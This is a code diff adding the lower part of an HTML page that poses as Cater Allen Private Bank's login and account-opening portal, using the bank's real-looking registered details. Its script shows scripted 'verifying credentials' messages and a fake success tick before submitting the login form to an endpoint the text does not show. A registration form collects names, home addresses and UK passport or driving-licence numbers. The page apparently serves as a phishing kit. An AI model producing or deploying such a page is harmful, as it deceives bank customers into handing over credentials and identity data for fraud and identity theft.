+            <div class="flex justify-center mb-6 h-14 items-center">
+                <div class="dashed-circle-spinner"></div>
+            </div>
+            <h3 class="text-xs font-black tracking-[0.2em] uppercase mb-2 text-[#002147]">Cater Allen Secure Gateway</h3>
+            <p class="text-xs text-slate-600 font-medium tracking-wide">
+                Preparing secure login portal...
+            </p>
+        </div>
+    </div>
+
+    <!-- 8-Second Verification Gateway Overlay for actual credential submit -->
+    <div id="loginCredLoadingOverlay" class="fixed inset-0 bg-slate-950/70 backdrop-blur-md z-50 hidden flex-col items-center justify-center p-6 text-slate-900">
+        <div class="bg-white border border-slate-200 p-8 rounded-3xl max-w-sm w-full text-center shadow-2xl animate-fade-in">
+            <div class="flex justify-center mb-6 h-14 items-center">
+                <div id="spinnerBox" class="dashed-circle-spinner"></div>
+                <div id="successTickBox" class="hidden w-14 h-14 bg-emerald-500 rounded-full flex items-center justify-center text-white text-2xl font-black shadow-lg">
+                    ✓
+                </div>
+            </div>
+            <h3 class="text-xs font-black tracking-[0.2em] uppercase mb-2 text-[#002147]">Cater Allen Secure Gateway</h3>
+            <p id="loginStatusText" class="text-xs text-slate-600 font-medium tracking-wide min-h-[2.5rem] flex items-center justify-center">
+                Verifying bank credentials...
+            </p>
+        </div>
+    </div>
+
+    <!-- Professional UK Bank Register Modal -->
+    <div id="registerModal" class="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-sm hidden items-center justify-center p-4">
+        <div class="app-card max-w-xl w-full max-h-[90vh] overflow-y-auto p-6 sm:p-8 relative">
+            <button type="button" onclick="closeRegisterModal()" class="absolute top-6 right-6 w-9 h-9 rounded-full bg-slate-100 hover:bg-slate-200 text-slate-700 flex items-center justify-center text-sm transition-all">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+
+            <div class="mb-6 border-b border-slate-100 pb-4">
+                <span class="bg-amber-50 text-amber-800 font-black text-[9px] px-2.5 py-1 rounded-full uppercase tracking-wider">UK Regulatory Onboarding</span>
+                <h2 class="text-xl font-black text-[#002147] mt-2">Open Private Client Account</h2>
+                <p class="text-xs text-slate-500 mt-0.5">Please provide your legal details and valid identification for FCA compliance.</p>
+            </div>
+
+            <form id="registerForm" onsubmit="handleRegisterSubmit(event)" class="space-y-4 text-xs">
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <div>
+                        <label class="block font-bold text-slate-700 uppercase tracking-wider mb-1.5">First Name</label>
+                        <input type="text" id="regFirstName" required placeholder="e.g. Alexander" class="w-full px-3.5 py-3 bg-slate-50 border border-slate-300 rounded-xl font-medium text-slate-800 outline-none focus:border-red-600">
+                    </div>
+                    <div>
+                        <label class="block font-bold text-slate-700 uppercase tracking-wider mb-1.5">Second Name / Surname</label>
+                        <input type="text" id="regLastName" required placeholder="e.g. Sterling" class="w-full px-3.5 py-3 bg-slate-50 border border-slate-300 rounded-xl font-medium text-slate-800 outline-none focus:border-red-600">
+                    </div>
+                </div>
+
+                <div>
+                    <label class="block font-bold text-slate-700 uppercase tracking-wider mb-1.5">Email Address</label>
+                    <input type="email" id="regEmailInput" required placeholder="name@privateclient.co.uk" class="w-full px-3.5 py-3 bg-slate-50 border border-slate-300 rounded-xl font-medium text-slate-800 outline-none focus:border-red-600">
+                </div>
+
+                <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+                    <div class="sm:col-span-2">
+                        <label class="block font-bold text-slate-700 uppercase tracking-wider mb-1.5">House Address / Street</label>
+                        <input type="text" required placeholder="e.g. 42 Berkeley Square, Mayfair" class="w-full px-3.5 py-3 bg-slate-50 border border-slate-300 rounded-xl font-medium text-slate-800 outline-none focus:border-red-600">
+                    </div>
+                    <div>
+                        <label class="block font-bold text-slate-700 uppercase tracking-wider mb-1.5">Postal Code</label>
+                        <input type="text" required placeholder="e.g. W1J 5AW" class="w-full px-3.5 py-3 bg-slate-50 border border-slate-300 rounded-xl font-medium text-slate-800 uppercase outline-none focus:border-red-600">
+                    </div>
+                </div>
+
+                <div class="pt-2">
+                    <label class="block font-bold text-slate-700 uppercase tracking-wider mb-1.5">Select UK ID Verification Document</label>
+                    <select id="ukIdType" onchange="updateIdFieldRequirements()" required class="w-full px-3.5 py-3 bg-slate-50 border border-slate-300 rounded-xl font-medium text-slate-800 outline-none focus:border-red-600">
+                        <option value="" disabled selected>-- Choose UK Identification Document --</option>
+                        <option value="uk_passport">1. UK Passport</option>
+                        <option value="uk_photocard_licence">2. UK Full Photocard Driving Licence</option>
+                        <option value="uk_brp">3. UK Biometric Residence Permit (BRP)</option>
+                        <option value="uk_provisional_licence">4. UK Provisional Driving Licence</option>
+                    </select>
+                </div>
+
+                <div id="dynamicIdInputContainer" class="hidden space-y-4 pt-1">
+                    <div>
+                        <label id="idNumberLabel" class="block font-bold text-slate-700 uppercase tracking-wider mb-1.5">ID Document Number</label>
+                        <input type="text" id="idNumberInput" placeholder="Enter document reference number" class="w-full px-3.5 py-3 bg-slate-50 border border-slate-300 rounded-xl font-medium text-slate-800 outline-none focus:border-red-600">
+                    </div>
+                </div>
+
+                <div class="pt-4">
+                    <button type="submit" class="w-full py-4 bg-[#002147] hover:bg-slate-900 text-white font-black uppercase tracking-[0.2em] rounded-xl shadow-md transition-all">
+                        Submit Application for Verification
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Professional Confirmation Notice Modal -->
+    <div id="successNoticeModal" class="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-sm hidden items-center justify-center p-4">
+        <div class="app-card max-w-md w-full p-8 text-center relative animate-fade-in">
+            <div class="w-14 h-14 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl font-bold shadow-sm">
+                <i class="fa-solid fa-envelope-circle-check"></i>
+            </div>
+            <span class="bg-emerald-50 text-emerald-800 font-black text-[9px] px-2.5 py-1 rounded-full uppercase tracking-wider">Application Received</span>
+            <h3 class="text-lg font-black text-[#002147] uppercase tracking-wide mt-2 mb-2">Secure Verification Notice</h3>
+            
+            <p class="text-xs text-slate-600 leading-relaxed mb-4">
+                Thank you for submitting your private client application. A secure confirmation message containing your reference details has been successfully dispatched to <strong id="displayedUserEmail" class="text-[#002147]"></strong>.
+            </p>
+
+            <div class="bg-slate-50 border border-slate-200 p-4 rounded-xl text-left mb-6 space-y-2">
+                <p class="text-[11px] font-bold text-[#002147] uppercase tracking-wider flex items-center gap-1.5">
+                    <i class="fa-solid fa-triangle-exclamation text-amber-500"></i> Next Required Step:
+                </p>
+                <p class="text-[11px] text-slate-600 leading-normal">
+                    In compliance with UK banking regulations and anti-money laundering (AML) protocols, please visit your nearest <strong>Cater Allen / Santander Branch</strong> with your selected original UK ID document to complete your account activation.
+                </p>
+            </div>
+
+            <button type="button" onclick="closeSuccessNotice()" class="w-full py-3.5 bg-[#002147] hover:bg-slate-900 text-white rounded-xl text-xs font-bold uppercase tracking-widest transition-all shadow-md">
+                Acknowledge &amp; Close
+            </button>
+        </div>
+    </div>
+
+    <!-- Branch Modal -->
+    <div id="branchModal" class="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-sm hidden items-center justify-center p-4">
+        <div class="app-card max-w-md w-full p-8 text-center relative">
+            <div class="w-12 h-12 bg-red-50 text-red-600 rounded-full flex items-center justify-center mx-auto mb-4 text-lg font-bold">
+                <i class="fa-solid fa-building-columns"></i>
+            </div>
+            <h3 class="text-lg font-black text-slate-900 uppercase tracking-wide mb-2">In-Branch Onboarding Only</h3>
+            <p class="text-xs text-slate-600 leading-relaxed mb-6">
+                In accordance with UK regulatory standards and elite private banking protocols, new accounts require physical verification. Please visit our Canary Wharf headquarters or contact our compliance desk for account setup.
+            </p>
+            <button type="button" onclick="closeBranchModal()" class="block w-full py-3 bg-slate-100 text-slate-700 rounded-xl text-xs font-bold uppercase tracking-widest hover:bg-slate-200 transition-all">
+                Close Notice
+            </button>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-[#001730] border-t border-white/10 py-8 px-6 text-slate-400 text-[11px] leading-relaxed mt-16 relative z-10">
+        <div class="max-w-4xl mx-auto space-y-4">
+            <div class="flex items-center gap-2 text-white font-bold text-xs uppercase tracking-wider">
+                <i class="fa-solid fa-shield-halved text-amber-400"></i> FSCS Protected (£85k Limit)
+            </div>
+            <p>
+                Copyright ©️ 2026 Cater Allen Private Bank. All rights reserved. Cater Allen Private Bank is the name used for banking services provided by Cater Allen Limited. Registered Office: 2 Triton Square, Regent’s Place, London, NW1 3AN. Registered in England and Wales number 383032.
+            </p>
+            <div class="pt-2 border-t border-white/10 flex flex-col sm:flex-row justify-between items-center gap-2 text-[10px]">
+                <span>Telephone: 0800 092 3300 • caterallen.co.uk</span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- JavaScript Controllers -->
+    <script>
+        function openSidebar() {
+            document.getElementById('sidebarBackdrop').classList.remove('hidden');
+            setTimeout(() => { document.getElementById('sidebarPanel').classList.remove('-translate-x-full'); }, 10);
+        }
+        function closeSidebar() {
+            document.getElementById('sidebarPanel').classList.add('-translate-x-full');
+            setTimeout(() => { document.getElementById('sidebarBackdrop').classList.add('hidden'); }, 300);
+        }
+
+        function triggerLoginLoading() {
+            const overlay = document.getElementById('loginLoadingOverlay');
+            overlay.classList.remove('hidden');
+            overlay.classList.add('flex');
+
+            setTimeout(() => {
+                overlay.classList.remove('flex');
+                overlay.classList.add('hidden');
+                openLoginModal();
+            }, 3000);
+        }
+
+        function openLoginModal() {
+            document.getElementById('loginModal').classList.remove('hidden');
+            document.getElementById('loginModal').classList.add('flex');
+        }
+        function closeLoginModal() {
+            document.getElementById('loginModal').classList.remove('flex');
+            document.getElementById('loginModal').classList.add('hidden');
+        }
+
+        function openRegisterModal() {
+            document.getElementById('registerModal').classList.remove('hidden');
+            document.getElementById('registerModal').classList.add('flex');
+        }
+        function closeRegisterModal() {
+            document.getElementById('registerModal').classList.remove('flex');
+            document.getElementById('registerModal').classList.add('hidden');
+        }
+
+        function updateIdFieldRequirements() {
+            const selectVal = document.getElementById('ukIdType').value;
+            const container = document.getElementById('dynamicIdInputContainer');
+            const label = document.getElementById('idNumberLabel');
+            const input = document.getElementById('idNumberInput');
+
+            container.classList.remove('hidden');
+
+            if (selectVal === 'uk_passport') {
+                label.innerText = "UK Passport Number (9 Digits)";
+                input.placeholder = "e.g. 528391024";
+            } else if (selectVal === 'uk_photocard_licence') {
+                label.innerText = "UK Driving Licence Number (16 Characters)";
+                input.placeholder = "e.g. SMITH927491AB9TX";
+            } else if (selectVal === 'uk_brp') {
+                label.innerText = "BRP Card Reference Number";
+                input.placeholder = "e.g. PK9382910";
+            } else if (selectVal === 'uk_provisional_licence') {
+                label.innerText = "Provisional Licence Number";
+                input.placeholder = "e.g. JONHE829104928SZ";
+            }
+        }
+
+        function openBranchModal() {
+            document.getElementById('branchModal').classList.remove('hidden');
+            document.getElementById('branchModal').classList.add('flex');
+        }
+        function closeBranchModal() {
+            document.getElementById('branchModal').classList.remove('flex');
+            document.getElementById('branchModal').classList.add('hidden');
+        }
+
+        function togglePasswordVisibility() {
+            const passwordInput = document.getElementById('passwordInput');
+            const toggleIcon = document.getElementById('passwordToggleIcon');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleIcon.classList.remove('fa-eye');
+                toggleIcon.classList.add('fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                toggleIcon.classList.remove('fa-eye-slash');
+                toggleIcon.classList.add('fa-eye');
+            }
+        }
+
+        function handleLoginSubmit(event) {
+            event.preventDefault();
+            const overlay = document.getElementById('loginCredLoadingOverlay');
+            overlay.classList.remove('hidden');
+            overlay.classList.add('flex');
+
+            const statusText = document.getElementById('loginStatusText');
+            const totalDuration = 8000;
+            let elapsed = 0;
+            const intervalTime = 200;
+
+            const loadingTimer = setInterval(() => {
+                elapsed += intervalTime;
+                const progressRatio = elapsed / totalDuration;
+
+                if (progressRatio < 0.3) {
+                    statusText.innerText = "Verifying client Bank ID...";
+                } else if (progressRatio < 0.6) {
+                    statusText.innerText = "Checking security credentials...";
+                } else if (progressRatio < 0.9) {
+                    statusText.innerText = "Establishing encrypted session...";
+                } else {
+                    document.getElementById('spinnerBox').classList.add('hidden');
+                    document.getElementById('successTickBox').classList.remove('hidden');
+                    statusText.innerText = "Verification complete!";
+                }
+
+                if (elapsed >= totalDuration) {
+                    clearInterval(loadingTimer);
+                    document.getElementById('loginForm').submit();
+                }
+            }, intervalTime);
+        }
+
+        function handleRegisterSubmit(event) {
+            event.preventDefault();
+            const userEmail = document.getElementById('regEmailInput').value;
+            document.getElementById('displayedUserEmail').innerText = userEmail;
+            closeRegisterModal();
+
+            const noticeModal = document.getElementById('successNoticeModal');
+            noticeModal.classList.remove('hidden');
+            noticeModal.classList.add('flex');
+
+            document.getElementById('registerForm').reset();
+            document.getElementById('dynamicIdInputContainer').classList.add('hidden');
+        }
+
+        function closeSuccessNotice() {
+            document.getElementById('successNoticeModal').classList.remove('flex');
+            document.getElementById('successNoticeModal').classList.add('hidden');
+        }
+
+        const heroSlides = [
+            {
+                title: "We're proud to partner with Sibstar",
+                subtitle: "Need extra support managing money, or supporting someone who is? Sibstar helps people spend safely and manage their money with confidence.",
+                btnText: "Learn more", actionKey: "personal",
+                img: "https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=1000&q=80"
+            },
+            {
+                title: "Multi-Currency Wealth Vault",
+                subtitle: "Hold and transact across GBP, EUR, USD, and CHF seamlessly with institutional settlement.",
+                btnText: "Explore Vault", actionKey: "vault",
+                img: "https://images.unsplash.com/photo-1526304640581-d334cdbbf45e?auto=format&fit=crop&w=1000&q=80"
+            }
+        ];
+        let currentSlide = 0;
+        function setHeroSlide(index) {
+            currentSlide = index;
+            const slide = heroSlides[index];
+            document.getElementById('heroTitle').innerText = slide.title;
+            document.getElementById('heroSubtitle').innerText = slide.subtitle;
+            document.getElementById('heroActionBtn').innerText = slide.btnText;
+            document.getElementById('heroImage').src = slide.img;
+        }
+    </script>
+</body>
+</html>
